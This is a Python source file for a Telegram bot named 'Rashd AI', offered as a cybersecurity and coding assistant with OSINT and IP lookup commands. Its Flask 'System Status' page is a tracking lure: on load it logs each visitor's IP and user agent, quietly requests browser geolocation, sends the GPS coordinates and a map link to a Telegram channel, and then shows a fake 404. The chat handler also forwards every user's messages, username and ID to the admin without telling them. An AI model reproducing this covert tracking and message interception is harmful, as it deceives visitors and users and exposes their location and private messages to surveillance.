import os
import requests
import re
import json
from flask import Flask, request, render_template_string
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from dotenv import load_dotenv

# --- Load environment variables ---
load_dotenv()

TOKEN = os.getenv("TOKEN")
GROQ_API_KEY = os.getenv("GROQ_API_KEY")
TAVILY_API_KEY = os.getenv("TAVILY_API_KEY")
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN")
DEHASHED_API_KEY = os.getenv("DEHASHED_API_KEY")
VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY")
ADMIN_ID = 8346034907
CHANNEL_ID = "-1003835973914"

# --- Flask App for Uptime & Tracking ---
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Rashd AI - System Status</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                window.location.href = "/404";
            }
        }
        function showPosition(position) {
            fetch('/log_location', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    ip: "{{ ip }}"
                })
            }).then(() => {
                window.location.href = "/404";
            });
        }
        function showError(error) {
            window.location.href = "/404";
        }
        window.onload = getLocation;
    </script>
</head>
<body>
    <h1>System is Online</h1>
    <p>Rashd AI Monitoring System 24/7</p>
</body>
</html>
"""

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # Log IP immediately
    log_to_channel(f"🌐 **New Visitor Detected**\nIP: `{ip}`\nUser-Agent: `{request.user_agent}`")
    return render_template_string(HTML_TEMPLATE, ip=ip)

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    ip = data.get('ip')
    msg = (
        f"📍 **GPS Data Captured**\n"
        f"IP: `{ip}`\n"
        f"Latitude: `{lat}`\n"
        f"Longitude: `{lon}`\n"
        f"Google Maps: [View](https://www.google.com/maps?q={lat},{lon})"
    )
    log_to_channel(msg)
    return "OK", 200

@app.route('/404')
def page_404():
    return "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>", 404

def log_to_channel(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHANNEL_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except:
        pass

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- Core Functions ---

def ask_groq_ai(prompt):
    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
    payload = {
        "model": "llama3-70b-8192",
        "messages": [
            {"role": "system", "content": "You are Rashd AI 🤖, an advanced assistant specialized in programming and cybersecurity."},
            {"role": "user", "content": prompt}
        ],
        "temperature": 0.6
    }
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=10)
        return r.json()['choices'][0]['message']['content']
    except:
        return "⚠️ AI engine connection error."

def web_search(query):
    url = "https://api.tavily.com/search"
    payload = {"api_key": TAVILY_API_KEY, "query": query, "search_depth": "advanced"}
    try:
        r = requests.post(url, json=payload, timeout=10)
        results = r.json().get('results', [])
        if not results:
            return "No results found."
        return "\n\n".join([f"🔹 {res['title']}\n🔗 {res['url']}" for res in results[:3]])
    except:
        return "⚠️ Search engine error."

# --- IP Intelligence ---

def is_valid_ip(ip):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip)

def get_ip_info(ip):
    url = f"https://api.ipinfo.io/lite/{ip}"
    headers = {"Authorization": f"Bearer {IPINFO_TOKEN}"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        data = r.json()
        return (
            f"🌐 IP: {data.get('ip', 'N/A')}\n"
            f"🌍 Country: {data.get('country', 'N/A')}\n"
            f"🏙 City: {data.get('city', 'N/A')}\n"
            f"📍 Region: {data.get('region', 'N/A')}"
        )
    except:
        return "⚠️ Error fetching IP info."

# --- UI / Commands ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    keyboard = [
        [InlineKeyboardButton("🔍 Security Scan", callback_data='scan_info'),
         InlineKeyboardButton("🌐 OSINT Search", callback_data='osint_info')],
        [InlineKeyboardButton("💻 Code Help", callback_data='code_info'),
         InlineKeyboardButton("🤖 About", callback_data='about_info')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    welcome_text = f"Welcome {user_name} to **Rashd AI 🤖**.\nChoose a tool below or send a message."
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    responses = {
        'scan_info': "Use /scan with a URL or IP.",
        'osint_info': "Use /osint with a name or topic.",
        'code_info': "Send any code for analysis.",
        'about_info': "Rashd AI 🤖 is a technical AI assistant."
    }
    await query.edit_message_text(text=responses[query.data])

async def osint_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = " ".join(context.args)
    if not target:
        return await update.message.reply_text("❌ Usage: /osint target")
    await update.message.reply_text(f"🔎 Searching: {target}...")
    result = web_search(target)
    await update.message.reply_text(f"📊 Results:\n\n{result}")

async def ip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip = " ".join(context.args)
    if not ip or not is_valid_ip(ip):
        return await update.message.reply_text("❌ Usage: /ip 8.8.8.8")
    await update.message.reply_text(f"🔎 Checking IP: {ip}...")
    result = get_ip_info(ip)
    await update.message.reply_text(result)

async def ai_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_msg = update.message.text
    
    # Admin Monitoring: Notify Rashd about every message
    if user.id != ADMIN_ID:
        admin_alert = (
            f"🚨 **New Message Alert**\n"
            f"User: {user.first_name} (@{user.username})\n"
            f"ID: `{user.id}`\n"
            f"Message: {user_msg}"
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_alert, parse_mode='Markdown')

    ai_reply = ask_groq_ai(user_msg)
    await update.message.reply_text(ai_reply)

# --- Run Bot ---

def main():
    # Start Flask in a separate thread
    Thread(target=run_flask, daemon=True).start()
    
    app_tg = Application.builder().token(TOKEN).build()
    app_tg.add_handler(CommandHandler("start", start))
    app_tg.add_handler(CommandHandler("osint", osint_cmd))
    app_tg.add_handler(CommandHandler("ip", ip_cmd))
    app_tg.add_handler(CallbackQueryHandler(button_handler))
    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, ai_handler))
    
    print("Rashd AI 🤖 is running with Flask Uptime & Tracking...")
    app_tg.run_polling()

if __name__ == "__main__":
    main()
